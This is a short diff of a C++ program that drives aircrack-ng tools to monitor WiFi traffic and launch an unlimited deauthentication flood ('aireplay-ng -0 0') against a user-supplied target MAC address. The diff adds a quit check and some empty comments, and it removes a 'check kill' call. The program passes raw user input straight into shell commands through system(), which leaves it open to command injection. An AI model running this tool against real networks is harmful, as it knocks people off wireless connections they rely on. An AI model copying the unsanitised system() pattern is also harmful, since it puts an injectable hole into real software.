@@ -24,6 +24,9 @@ int main() {
 	system ("airodump-ng wlan0mon");
 	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Target MAC Address:$(tput bold)$(tput smul)$(tput sgr 0)\"");
 	cin >> answer;
+	if (answer == "quit" || answer == "exit") {
+		return 0;
+	}
 	dir = "mkdir ";
 	dir += answer;
 	system(dir.c_str());
@@ -33,9 +36,11 @@ int main() {
 	t_mac_a = "airmon-ng start wlan0 ";
 	t_mac_a += answer2;
 	system(t_mac_a.c_str());
-	system("airmon-ng check kill");
 	randomize();
+	//
 	gnome_terminal(answer, answer2);
+	//
+
 	deauth = "aireplay-ng -0 0 -a ";
 	deauth += answer;
 	deauth += " wlan0mon";
@@ -46,7 +51,9 @@ int main() {
 	cout << endl;
 	system("echo \"$(tput bold)$(tput smul)$(tput setaf 6)Cleaning:$(tput sgr 0)\"");
 	system("cd ..");
+	//
 	organize(answer);
+	//
 	reset_mac();
 	clean();
 }
